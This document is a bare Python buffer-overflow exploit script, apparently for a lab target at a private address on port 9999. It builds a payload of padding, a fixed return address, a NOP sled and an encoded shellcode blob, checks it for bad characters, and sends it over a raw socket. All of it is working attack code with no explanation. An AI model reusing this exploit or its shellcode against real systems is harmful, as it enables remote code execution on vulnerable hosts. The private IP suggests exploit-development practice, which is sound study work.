import socket
OFFSET_RET = 524
junk = b"A" * OFFSET_RET
ret = b"\xf3\x12\x17\x31" 
nop_sled = b"\x90" * 16
buf =  b""
buf += b"\xbf\x56\xa5\xfd\x19\xda\xd0\xd9\x74\x24\xf4\x5d"
buf += b"\x31\xc9\xb1\x12\x83\xc5\x04\x31\x7d\x0e\x03\x2b"
buf += b"\xab\x1f\xec\xe2\x68\x28\xec\x57\xcc\x84\x99\x55"
buf += b"\x5b\xcb\xee\x3f\x96\x8c\x9c\xe6\x98\xb2\x6f\x98"
buf += b"\x90\xb5\x96\xf0\xe2\xee\x51\x6a\x8b\xec\xa1\x7b"
buf += b"\x17\x78\x40\xcb\xc1\x2a\xd2\x78\xbd\xc8\x5d\x9f"
buf += b"\x0c\x4e\x0f\x37\xe1\x60\xc3\xaf\x95\x51\x0c\x4d"
buf += b"\x0f\x27\xb1\xc3\x9c\xbe\xd7\x53\x29\x0c\x97"
payload = junk + ret + nop_sled + buf
badchars = [b"\x00", b"\x0a", b"\x0d"]
assert len(payload) <= 1000
assert not any(bad in payload for bad in badchars), \
       f"Payload contains one of badchars: {badchars!r}"
target_ip = "192.168.56.123"
target_port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.recv(1024)
s.send(payload)
s.close
